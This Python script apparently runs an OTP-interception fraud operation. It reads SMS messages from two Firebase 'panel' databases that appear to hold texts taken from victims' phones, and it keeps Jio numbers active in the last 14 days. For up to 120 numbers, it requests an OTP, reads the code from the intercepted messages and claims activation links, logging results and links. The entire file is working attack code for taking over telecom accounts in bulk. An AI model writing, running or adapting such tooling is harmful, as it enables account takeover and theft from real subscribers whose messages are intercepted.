#!/usr/bin/env python3
"""Fresh Jio Gemini run v3: deep message scan (100/device), activity filter,
priority on simInfo numbers, then OTP -> activation flow."""
import sys, asyncio, aiohttp, json, time, re
from datetime import datetime
sys.path.insert(0, "/root/jio_farm")
import myjio
import requests

PANELS = [
    "https://jackie-7a125-default-rtdb.firebaseio.com",
    "https://vicky-singh-20bdd-default-rtdb.firebaseio.com",
]
MAX_NUMBERS = 120
ACTIVE_DAYS = 14

def parse_dt(s):
    for fmt in ("%d-%m-%Y | %I:%M %p", "%d-%m-%Y %I:%M %p", "%d-%m-%Y"):
        try:
            return datetime.strptime(str(s).strip(), fmt)
        except Exception:
            pass
    return None

async def get_json(s, url, params=None):
    try:
        async with s.get(url, params=params or {}) as r:
            if r.status != 200:
                return None
            txt = await r.text()
            if not txt or txt == "null":
                return None
            return json.loads(txt)
    except Exception:
        return None

async def scan_device(s, base, dev, sem, out):
    async with sem:
        data = await get_json(s, f"{base}/messages/{dev}.json",
                              {"orderBy": '"$key"', "limitToLast": "100"})
        if not isinstance(data, dict):
            return
        msgs = {k: v for k, v in data.items() if isinstance(v, dict)}
        if not msgs:
            return
        # activity check: newest message dateTime
        newest = None
        for item in msgs.values():
            dt = parse_dt(item.get("dateTime", ""))
            if dt and (newest is None or dt > newest):
                newest = dt
        if newest is None or (datetime.now() - newest).days > ACTIVE_DAYS:
            return
        if not myjio.is_jio_sim_device(msgs):
            return
        # priority: simInfo/phoneNumber present?
        prio = 0
        for item in msgs.values():
            si = item.get("simInfo")
            if isinstance(si, dict) and myjio.normalize_mobile(si.get("phoneNumber")):
                prio = 1
                break
            if myjio.normalize_mobile(item.get("phoneNumber")):
                prio = 1
                break
        for mobile in myjio.number_candidates(msgs):
            out.setdefault(mobile, []).append((base, dev, prio))

async def main():
    t0 = time.time()
    found = {}
    conn = aiohttp.TCPConnector(limit=60)
    timeout = aiohttp.ClientTimeout(total=40)
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
        for base in PANELS:
            shallow = await get_json(s, f"{base}/messages.json", {"shallow": "true"})
            devs = list(shallow.keys()) if isinstance(shallow, dict) else []
            print(f"{base} → {len(devs)} devices", flush=True)
            sem = asyncio.Semaphore(50)
            await asyncio.gather(*[scan_device(s, base, d, sem, found) for d in devs])
            print(f"  active jio numbers so far: {len(found)} ({int(time.time()-t0)}s)", flush=True)

    used = myjio.load_used_numbers()
    fresh = []
    for m, lst in found.items():
        if m in used:
            continue
        base, dev, prio = sorted(lst, key=lambda x: -x[2])[0]
        fresh.append((prio, m, base, dev))
    fresh.sort(key=lambda x: (-x[0], x[1]))
    print(f"\nActive Jio numbers: {len(found)} | fresh: {len(fresh)} | prio1: {sum(1 for f in fresh if f[0]==1)}", flush=True)
    targets = fresh[:MAX_NUMBERS]
    print(f"Processing {len(targets)} fresh numbers...\n", flush=True)

    panel_sessions = {b: myjio.firebase_session() for b in PANELS}
    statuses = {}
    valid_links = 0
    for serial, (prio, mobile, base, dev) in enumerate(targets, start=1):
        print(f"\n[{serial}/{len(targets)}] p{prio} {base.split('//')[1][:26]} dev={dev[:12]} ending {mobile[-4:]}", flush=True)
        firebase = panel_sessions[base]
        jio = myjio.jio_session()
        try:
            if not myjio.is_jio_number(jio, mobile):
                status, url = "not_jio_number", ""
            else:
                r = requests.get(f"{base}/messages/{dev}.json",
                                 params={"orderBy": '"$key"', "limitToLast": "5"}, timeout=20)
                try:
                    d = r.json()
                    known = set(d.keys()) if isinstance(d, dict) else set()
                except Exception:
                    known = set()
                if not myjio.send_otp(jio, mobile):
                    status, url = "otp_send_failed", ""
                elif not myjio.wait_for_otp(firebase, base, "", dev, known, jio, mobile):
                    status, url = "otp_failed", ""
                else:
                    status, url = myjio.get_activation(jio)
        except Exception as e:
            status, url = f"error:{e}", ""
        statuses[status] = statuses.get(status, 0) + 1
        myjio.save_used_number(mobile)
        if myjio.save_link(url):
            valid_links += 1
        myjio.save_result(serial, dev, mobile, status, url)
        print(f"Status: {status}", flush=True)
        if url:
            print(f"LINK → {url}", flush=True)

    print("\n==== SUMMARY ====", flush=True)
    for st, c in sorted(statuses.items()):
        print(f"{st:25}: {c}", flush=True)
    print(f"VALID new links: {valid_links}", flush=True)

if __name__ == "__main__":
    asyncio.run(main())
